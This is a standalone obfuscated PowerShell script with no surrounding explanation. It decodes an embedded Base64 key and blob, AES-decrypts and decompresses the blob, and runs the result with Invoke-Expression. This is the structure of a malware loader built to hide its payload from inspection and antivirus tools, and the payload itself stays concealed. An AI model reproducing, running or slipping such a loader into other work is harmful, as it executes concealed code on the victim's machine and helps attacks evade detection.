$piyvgj = [System.Convert]::FromBase64String("Kui3xP0tkccqBMk8mSPI7UE2tPTlqxuwwJ+9T9ZNIyc=")
$itvp = New-Object "System.Security.Cryptography.AesManaged"
$zkbyngr = [System.Convert]::FromBase64String("9wCTZQI62c5rX6TeqprXV78y9yL6ewExqPFLuFjPIi3GGLXNp1BXSVIQH1YPVEt0GeCOn9vTea2FCG9vvGAE4pnoNZjWZNKKvbbHwK5XzxupY6d01cdJtakEwfhMZ+wypD0DiUoh7+YbmOHHyhFjRhHrldwzhp8miJgcpEXgwIEkpx8e0BWrht02IZZSGHdtg0m/tVQ+zt8ZYMqhYpVChimYszAOMVijWqFrxjn+YtR/k56VZdCFMwZVJI9PPHzzR7MtyCMxaqFKIASG9thhX7yryrYKwQZpv6NkrShiYEQqm/ye4wYd2OdxNrxerO8cbv5zmeaWYzHMxVtIQCLqjgyEo6qFvBArXReKQTqtL/JGZeEMSpY+J1KWrWTKe4tZaKfyy68OIrSiqRK5lJnSv7KHJWRcdiF2Yfaxir68VKX+WMF8YogoFlcQ1+NQQweBkP02+LaMSgkvKPM45LA412TS0o+mMUqlQ1oFHASfY9xy6fGHKMl9bMynE7oXJ6RL5cgKoJT7m8gAHdbkBEDlkPjNvy8G5og9I+fGDTzD6mN34dnrrLIgYfg2SIUbzRo6uYWcA8Dn/iJtmzS/t3G32fculeimfcDw7Djpa3K4W6GapC2welB0HCl/yn3wPElh05zBVhTzVKDZUFzPpA2Hf62glY+I0OPRFzjl/l8Iige27lRp4vGc8SjAOZmOw8wx9n03ugGTi5h3dsdV3KTDP/LCHjGsKj9TJzehYj66GZjwA1kypkCFCM3hvKZfNJtqoBhOCaUvmXb7pIKvB47fMuQ9vkvcHN0y2QbclrXy/SsGMzNUBfG8OxRoKQ3NN7SYQsqkJydS61up7zLhfWxCMdEF3qAY5t8B+VDvo8Ivwl1BolYhzW0kIRDj+il6NhSfG2F4+SRCExm+dGLNQL8VR0RNXSmjtoRu3a669wA4z0usG8edyYMtX+Ww5e1h9tOWGhbe2uieQ9Z69PGp3kKa5tu5I3f453uTwZ4rSbUlhqI=")
$itvp.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
$itvp.BlockSize = 128
$itvp.IV = $zkbyngr[0..15]
$itvp.KeySize = 192
$itvp.Key = $piyvgj
$itvp.Mode = [System.Security.Cryptography.CipherMode]::CBC
$xggm = New-Object System.IO.MemoryStream(,$itvp.CreateDecryptor().TransformFinalBlock($zkbyngr,16,$zkbyngr.Length-16))
$csqwpz = New-Object System.IO.MemoryStream
$twghv = New-Object System.IO.Compression.GzipStream $xggm, ([IO.Compression.CompressionMode]::Decompress)
$twghv.CopyTo($csqwpz)
$twghv.Close()
$xggm.Close()
$itvp.Dispose()
$epsdm = [System.Text.Encoding]::UTF8.GetString($csqwpz.ToArray())
Invoke-Expression($epsdm)
